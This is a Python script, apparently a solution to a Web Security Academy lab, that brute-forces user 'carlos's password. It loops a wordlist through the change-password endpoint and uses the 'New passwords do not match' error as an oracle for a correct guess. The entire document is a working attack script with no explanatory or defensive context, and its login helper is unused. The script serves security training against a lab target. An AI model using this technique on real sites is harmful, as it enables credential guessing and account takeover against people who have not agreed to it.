import requests

with open('password.txt') as f:
    passwords = f.read().splitlines()
    
LOGIN_URL = 'https://0a680058046ae1da8040990200b600c5.web-security-academy.net/login'
CHANGE_PASSWORD_URL = 'https://0a680058046ae1da8040990200b600c5.web-security-academy.net/my-account/change-password'

def login(username, password):
    response = requests.post(LOGIN_URL, data={
        'username': username,
        'password': password
    })
    if 'Current password' in response.text:
        return True
    else:
        return False

def change_password(password):
    print(f'[*] Trying password: {password}')
    response = requests.post(CHANGE_PASSWORD_URL, data={
        'username': 'carlos',
        'current-password': password,
        'new-password': 1,
        'confirm-new-password': 12
    })
    if 'New passwords do not match' in response.text:
        return True
    else:
        return False

def main():
    for password in passwords:
        if change_password(password):
            print(f'[+] Password found: {password}')
            break
        
if __name__ == '__main__':
    main()